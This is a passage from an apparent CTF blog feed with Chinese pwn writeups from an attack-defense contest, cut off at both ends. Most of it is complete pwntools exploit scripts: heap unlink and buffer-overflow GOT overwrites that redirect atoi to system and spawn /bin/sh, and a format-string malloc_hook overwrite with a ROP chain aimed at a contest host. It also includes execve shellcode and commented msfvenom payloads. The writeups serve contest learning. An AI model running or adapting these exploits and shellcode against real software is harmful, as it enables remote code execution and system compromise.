class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"><span class="comment"># get fastbin#2 addr</span></div><div class="line">ruin(<span class="number">2</span>,<span class="string">"n"</span>)</div><div class="line">ruin(<span class="number">1</span>,<span class="string">"n"</span>)</div><div class="line">show(<span class="number">1</span>)</div><div class="line">ru(<span class="string">"salves: "</span>)</div><div class="line">fast_bin_addr  = u64(ru(<span class="string">"\n="</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"fast_bin_addr#0="</span>+hex(fast_bin_addr)</div><div class="line"></div><div class="line"><span class="comment"># heap_base addr</span></div><div class="line"></div><div class="line">heap_addr = fast_bin_addr-(fast_bin_addr &amp; <span class="number">0xfff</span>)</div><div class="line">fast_bin_addr_ptr = heap_addr+<span class="number">0x10</span>+<span class="number">0x20</span></div><div class="line"></div><div class="line"><span class="comment"># rebuild </span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># overwrite small chunk size  unlink prev_fast_chunk</span></div><div class="line"></div><div class="line">fake_chunk_head = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(fast_bin_addr_ptr<span class="number">-0x18</span>)+p64(fast_bin_addr_ptr<span class="number">-0x10</span>)</div><div class="line">payload = fake_chunk_head</div><div class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">"\x00"</span>)</div><div class="line">update_slaves(<span class="number">0</span>,payload+p64(<span class="number">0x40</span>)+chr(<span class="number">0xe0</span>+<span class="number">0x10</span>))</div><div class="line"><span class="comment"># unlink</span></div><div class="line">ruin(<span class="number">1</span>,<span class="string">"y"</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x40131D\nc")</span></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">update_slaves(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x18</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line">update_slaves(<span class="number">0</span>,p64(elf.symbols[<span class="string">"printf"</span>]))</div><div class="line"></div><div class="line"><span class="comment"># leak libc and calc system_addr</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x2</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(p64(system_addr))</div><div class="line"><span class="comment"># exec /bin/sh</span></div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="第三个漏洞"><a href="#第三个漏洞" class="headerlink" title="第三个漏洞"></a>第三个漏洞</h3><p>第三个漏洞非常简单，字符串数组空间大小为0x20，然而却给它赋于了0x28的大小用户输入，导致其溢出覆盖了下一个指针，从而引发任意地址写的利用，我们可以利用任意地址写，将atoi改成printf来泄漏system地址，然后将atoi改成system实现任意代码执行,exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 09:43:44</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">payload = p64(elf.symbols[<span class="string">"printf"</span>])+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">5</span>)</div><div class="line">ru(<span class="string">"y/n)\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"nd up with '\\n')\n"</span>)</div><div class="line"></div><div class="line">payload = p64(system_addr)+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># \n</span></div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;将atoi_got修改成printf_plt，威力无穷~&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;string overflow&lt;/li&gt;
&lt;li&gt;int overflow&lt;/li&gt;
&lt;li&gt;off by one&lt;/li&gt;
&lt;li&gt;race condition&lt;/li&gt;
&lt;li&gt;heap overlay &lt;/li&gt;
&lt;li&gt;fmt&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="awd" scheme="https://winter3un.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>8月9日个人赛总结 &amp;&amp; writeup</title>
    <link href="https://winter3un.github.io/2017/08/10/2017-8-9/"/>
    <id>https://winter3un.github.io/2017/08/10/2017-8-9/</id>
    <published>2017-08-10T09:20:04.000Z</published>
    <updated>2018-06-15T08:42:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure><p>对于zip压缩包，还是archpr好用。。</p><p>对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。</p><p>对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）</p><p>rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）</p><p>线下赛的web waf需要完善。</p><p>新的pyc加密方式  <code>stegosaurus</code></p><p>writeup 如下<br><a id="more"></a></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>打开文件。。发现又要压缩密码。。。ORZ</p><p>linux/x86下一段汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">xor %eax, %eax</div><div class="line">xor %ebx, %ebx</div><div class="line">xor %ecx, %ecx</div><div class="line">push %ecx</div><div class="line">push $0x68732f2f</div><div class="line">push $0x6e69622f</div><div class="line">movl %esp,%ebx</div><div class="line">movb $11,%al</div><div class="line">int $0x80</div></pre></td></tr></table></figure></p><p>请将其提取为可用的shellcode,形式如\x01\x2d\x……的代码(字母小写)，shellcode的小写MD5<br>值为解压密码，上用pwntools的asm函数，将这些操作指令反汇编成机器码，如下</p><p><code>\x31\xc0\x31\xdb\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code></p><p>然后再用题目提供的md5计算器计算下md5即可。</p><p><code>68f3e981152d37d372d732d0c3ee3977</code></p><p>接着常规套路，IDA打开分析一波，等等？？这pwn文件怎么那么熟悉= =。。  这不是全国大学生信安赛pwn3么，原题。。。虽然当时没做出来，但是后来看着别人的writeup复现了，exp还在本地，但是执行的时候，没有拿到shell，再看了下pwn文件，发现很多地址都有变动。</p><p>变动的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">stack_povit = 0x00000000004b93f8</div><div class="line">pop_rdi_ret = 0x00000000004005d5</div><div class="line">fake_fsp = 0x06CCC10</div><div class="line">malloc_hook = 0x6CB788</div><div class="line">read_buf = 0x400AEE</div></pre></td></tr></table></figure><p>具体的思路的话，还是利用格式化字符串的漏洞，修改malloc_hook的数据，让其在接受比较大的参数数据的时候执行malloc，比如”%100000c”,我们便可以控制执行流了。但是这边是静态编译，也不能狗利用one_gadget，很绝望，然而我们可以构造裸的rop来调用syscall（hhhhh），首先得找一个stack_povit，使我们的栈空间得到迁移，在这迁移的栈空间上构造我们的rop，然后触发ret，执行我们的rop，就拿到shell啦，下面是exp。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils,os,time</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.2.10"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># elf = ELF(target)</span></div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400B69\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">stack_povit = <span class="number">0x00000000004b93f8</span></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">fake_fsp = <span class="number">0x06CCC10</span></div><div class="line">malloc_hook = <span class="number">0x6CB788</span></div><div class="line">read_buf = <span class="number">0x400AEE</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># payload = 'A'*8+"%6$n\0"</span></div><div class="line">l = []</div><div class="line">l.append((stack_povit ) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((stack_povit &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((read_buf) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((read_buf &gt;&gt; <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>)</div><div class="line"></div><div class="line">payload = <span class="string">""</span></div><div class="line">delta = <span class="number">0</span></div><div class="line">printed = <span class="number">0</span></div><div class="line">index = <span class="number">6</span> + <span class="number">14</span> <span class="comment"># target addr</span></div><div class="line"><span class="keyword">for</span> data <span class="keyword">in</span> l:</div><div class="line">delta = (data-printed)&amp;<span class="number">0xffff</span></div><div class="line">payload +=  <span class="string">'%'</span>+str(delta)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(index)+<span class="string">'$hn'</span></div><div class="line">printed += delta</div><div class="line">index += <span class="number">1</span></div><div class="line"><span class="comment"># payload+=(len(payload)%8)*'A'</span></div><div class="line">payload +=<span class="string">"%"</span>+str(fake_fsp<span class="number">-0x20</span>)+<span class="string">"s"</span></div><div class="line">payload = payload.ljust(<span class="number">14</span>*<span class="number">8</span>,<span class="string">'a'</span>)</div><div class="line"></div><div class="line"><span class="comment"># target addr</span></div><div class="line">payload += p64(malloc_hook)</div><div class="line">payload += p64(malloc_hook+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp)</div><div class="line">payload += p64(fake_fsp+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">8</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0xa</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x10</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x12</span>)</div><div class="line"></div><div class="line"></div><div class="line">sl(payload)</div><div class="line"></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">pop_rdx_rsi_ret = <span class="number">0x0000000000442a99</span></div><div class="line">pop_rax_rdx_rbx_ret = <span class="number">0x0000000000479836</span></div><div class="line">syscall = <span class="number">0x4004ce</span></div><div class="line">rop = <span class="string">"aaaa\x17"</span></div><div class="line">rop += 